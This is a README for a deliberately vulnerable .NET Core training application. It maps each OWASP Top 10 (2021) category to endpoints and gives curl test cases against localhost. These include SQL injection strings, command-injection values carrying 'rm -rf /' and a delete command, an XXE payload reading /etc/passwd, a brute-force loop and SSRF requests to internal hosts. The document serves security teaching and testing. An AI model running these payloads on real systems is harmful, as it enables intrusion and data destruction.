# OWASP Top 10 Vulnerable .NET Core Application

This is an intentionally vulnerable .NET Core web application created for **educational and security testing purposes only**. It demonstrates all 10 OWASP Top 10 (2021) vulnerabilities with real-world code examples.

⚠️ **WARNING: This application should NEVER be deployed to production or connected to the internet. Use only in isolated, controlled environments for learning and security testing.**

## Vulnerability Map

### A01:2021 - Broken Access Control
**Files & Endpoints:**
- `Controllers/AuthenticationController.cs` - `/api/authentication/debug-users` (no auth check)
- `Controllers/ProductsController.cs` - `/api/products/{id}`, `/api/products/{id}` DELETE (no IDOR checks)
- `Controllers/InsecureDesignController.cs` - `/api/insecuredesign/delete-user-account` (no authz)

**Vulnerabilities:**
- No authorization checks on sensitive endpoints
- Insecure Direct Object References (IDOR) - users can access/modify other users' data
- No role-based access control verification

**Test Cases:**
```bash
# Get all users without authentication
curl http://localhost:5000/api/authentication/debug-users

# Delete any product by ID without authorization
curl -X DELETE http://localhost:5000/api/products/1

# Delete any user account without authorization
curl -X POST http://localhost:5000/api/insecuredesign/delete-user-account?userId=1
```

---

### A02:2021 - Cryptographic Failures
**Files & Endpoints:**
- `Controllers/CryptographyController.cs` - Multiple endpoints
- `Models/User.cs` - Plaintext password storage

**Vulnerabilities:**
- Hardcoded encryption keys and IVs
- Plaintext password storage in database
- Use of MD5 for password hashing (no salt)
- Sensitive data stored without encryption
- Weak random number generation using `Random` instead of cryptographically secure RNG
- No enforcement of HTTPS

**Test Cases:**
```bash
# Encrypt data with hardcoded key
curl -X POST http://localhost:5000/api/cryptography/encrypt \
  -H "Content-Type: application/json" \
  -d '"SensitiveData"'

# Hash password with weak MD5
curl -X POST http://localhost:5000/api/cryptography/hash-password?password=MyPassword123

# Store SSN in plaintext
curl -X POST http://localhost:5000/api/cryptography/store-ssn?ssn=123-45-6789

# Generate weak token
curl http://localhost:5000/api/cryptography/generate-token
```

---

### A03:2021 - Injection
**Files & Endpoints:**
- `Controllers/ProductsController.cs` - `/api/products/search`
- `Controllers/ProductsController.cs` - `/api/products/generate-report`

**Vulnerabilities:**
- SQL Injection via string interpolation
- Command Injection via Process.Start with unsanitized input
- No input validation or parameterized queries

**Test Cases:**
```bash
# SQL Injection
curl "http://localhost:5000/api/products/search?name=Mouse' OR '1'='1"

# Command Injection (Windows)
curl -X POST "http://localhost:5000/api/products/generate-report?format=txt; del C:\\important\\file.txt"

# Command Injection (Linux)
curl -X POST "http://localhost:5000/api/products/generate-report?format=txt;rm -rf /"
```

---

### A04:2021 - Insecure Design
**Files & Endpoints:**
- `Controllers/InsecureDesignController.cs` - Multiple endpoints

**Vulnerabilities:**
- No rate limiting on login attempts (brute force possible)
- No CSRF protection
- No session timeout
- Missing security controls in design phase

**Test Cases:**
```bash
# Brute force unlimited login attempts
for i in {1..1000}; do
  curl -X POST "http://localhost:5000/api/insecuredesign/unlimited-login?username=admin&password=try$i"
done

# CSRF attack (no token validation)
curl -X POST "http://localhost:5000/api/insecuredesign/transfer-money?fromAccount=1&toAccount=2&amount=1000"

# Create permanent session (never expires)
curl -X POST "http://localhost:5000/api/insecuredesign/create-permanent-session?userId=123"
```

---

### A05:2021 - Security Misconfiguration
**Files:**
- `Program.cs` - Detailed error pages enabled
- Multiple controllers - Detailed error messages in responses

**Vulnerabilities:**
- Detailed error messages expose stack traces and internal information
- Debug mode enabled in all environments
- Exposes server version information
- No security headers configured
- CORS allows all origins

**Test Cases:**
```bash
# Trigger error to see stack trace and internal details
curl "http://localhost:5000/api/products/search?name=' OR 1=1 --"

# Get server information
curl http://localhost:5000/api/components/server-info

# Get dependency versions
curl http://localhost:5000/api/components/dependency-info
```

---

### A06:2021 - Vulnerable and Outdated Components
**Files & Endpoints:**
- `Controllers/ComponentsController.cs` - Multiple endpoints
- `OWASPVulnerableApp.csproj` - Outdated NuGet packages

**Vulnerabilities:**
- Outdated NuGet package versions
- Use of deprecated DES encryption (56-bit key)
- Vulnerable XML parsing (XXE potential)
- BinaryFormatter usage (unsafe deserialization)

**Test Cases:**
```bash
# Get outdated dependency information
curl http://localhost:5000/api/components/dependency-info

# XXE Attack (XML External Entity)
curl -X POST http://localhost:5000/api/components/parse-xml \
  -H "Content-Type: application/json" \
  -d '"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"'

# Encrypt with legacy DES
curl -X POST http://localhost:5000/api/components/encrypt-legacy?data=test
```

---

### A07:2021 - Identification and Authentication Failures
**Files & Endpoints:**
- `Controllers/AuthenticationController.cs` - All endpoints
- `Data/VulnerableDbContext.cs` - Seeded hardcoded credentials

**Vulnerabilities:**
- Plaintext password storage and comparison
- Hardcoded admin credentials
- No password validation or complexity requirements
- Hardcoded secrets in code
- No secure session tokens (JWT)
- Weak authentication logic

**Test Cases:**
```bash
# Login with plaintext password
curl -X POST "http://localhost:5000/api/authentication/login?username=admin&password=admin123"

# Admin login with hardcoded password
curl -X POST "http://localhost:5000/api/authentication/admin-login?password=SecurePassword123"

# Register with weak password
curl -X POST "http://localhost:5000/api/authentication/register?username=newuser&password=a"

# Discover hardcoded credentials from code review
grep -r "PASSWORD\|admin\|secret" .
```

---

### A08:2021 - Software and Data Integrity Failures
**Files & Endpoints:**
- `Controllers/ComponentsController.cs` - File upload handling
- `Controllers/CryptographyController.cs` - File upload endpoint

**Vulnerabilities:**
- No file signature verification
- No integrity checks on uploaded files
- Vulnerable deserialization
- No code signing verification
- Insecure CI/CD design

**Test Cases:**
```bash
# Upload malicious file without validation
curl -X POST -F "file=@malicious.exe" http://localhost:5000/api/cryptography/upload-file

# Upload file with arbitrary content
echo "malicious content" > payload.txt
curl -X POST -F "file=@payload.txt" http://localhost:5000/api/cryptography/upload-file
```

---

### A09:2021 - Logging and Monitoring Failures
**Files & Endpoints:**
- `Controllers/InsecureDesignController.cs` - Logging issues
- `Program.cs` - No security logging configured

**Vulnerabilities:**
- No audit trail for critical operations
- Logs stored without protection or encryption
- No monitoring of suspicious activities
- Failed login attempts not logged
- No alerting mechanism
- No integrity protection on logs

**Test Cases:**
```bash
# View application logs without authentication
curl http://localhost:5000/api/insecuredesign/view-logs

# Perform suspicious activity (no detection)
curl http://localhost:5000/api/insecuredesign/suspicious-check

# Delete user with no audit trail
curl -X POST "http://localhost:5000/api/insecuredesign/delete-user-account?userId=1"
```

---

### A10:2021 - Server-Side Request Forgery (SSRF)
**Files & Endpoints:**
- `Controllers/SSRFController.cs` - All endpoints

**Vulnerabilities:**
- Accepts arbitrary URLs without validation
- Can fetch internal resources (localhost, private IPs)
- Can download files from internal servers
- Can scan internal network ports
- Can act as proxy for arbitrary requests

**Test Cases:**
```bash
# Fetch internal metadata service
curl -X POST http://localhost:5000/api/ssrf/fetch-url \
  -H "Content-Type: application/json" \
  -d '"http://localhost:8000/internal/admin"'

# Scan internal network
curl -X POST "http://localhost:5000/api/ssrf/check-service?host=192.168.1.1&port=22"

# Download file from internal server
curl -X POST http://localhost:5000/api/ssrf/download-file \
  -H "Content-Type: application/json" \
  -d '"http://internal-server:8080/sensitive-data.txt"'

# Proxy request through the server
curl -X POST http://localhost:5000/api/ssrf/proxy-request \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal.service/admin","method":"GET"}'
```

---

## Project Structure

```
OWASPVulnerableApp/
├── Controllers/
│   ├── AuthenticationController.cs      (A07, A05)
│   ├── ProductsController.cs            (A03, A01, A09)
│   ├── CryptographyController.cs        (A02, A08)
│   ├── SSRFController.cs                (A10, A01)
│   ├── InsecureDesignController.cs      (A04, A09)
│   └── ComponentsController.cs          (A06, A02, A05)
├── Models/
│   ├── User.cs                          (A02, A07)
│   └── Product.cs
├── Data/
│   └── VulnerableDbContext.cs           (A07, A02)
├── Program.cs                           (A05, CORS)
├── OWASPVulnerableApp.csproj
└── README.md
```

## Setup & Running

### Prerequisites
- .NET 8.0 SDK or later
- SQL Server (local or remote)

### Installation
```bash
# Restore dependencies
dotnet restore

# Update database
dotnet ef database update

# Run the application
dotnet run --urls http://localhost:5000
```

### Access Points
- **Swagger UI**: http://localhost:5000/swagger
- **API Base**: http://localhost:5000/api/

## Security Testing Checklist

- [ ] Test SQL Injection on `/api/products/search`
- [ ] Test IDOR on `/api/products/{id}`
- [ ] Test plaintext credentials in `/api/authentication/login`
- [ ] Test Command Injection on `/api/products/generate-report`
- [ ] Test SSRF on `/api/ssrf/fetch-url`
- [ ] Test missing authentication on `/api/authentication/debug-users`
- [ ] Review hardcoded secrets in Controllers
- [ ] Test CSRF on `/api/insecuredesign/transfer-money`
- [ ] Analyze XXE vulnerability in XML parsing
- [ ] Test weak password hashing with MD5

## Educational Value

This application is designed to:
1. **Demonstrate real vulnerabilities** in code
2. **Teach secure coding practices**
3. **Provide hands-on security testing experience**
4. **Document common mistakes** developers make
5. **Show proper fixes** for each vulnerability

## Further Learning

- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [Microsoft Secure Coding Guidelines](https://docs.microsoft.com/en-us/dotnet/standard/security/secure-coding-guidelines)

## Disclaimer

This application is **FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before security testing.

---

**Created for OWASP Security Vulnerabilities Demonstration**
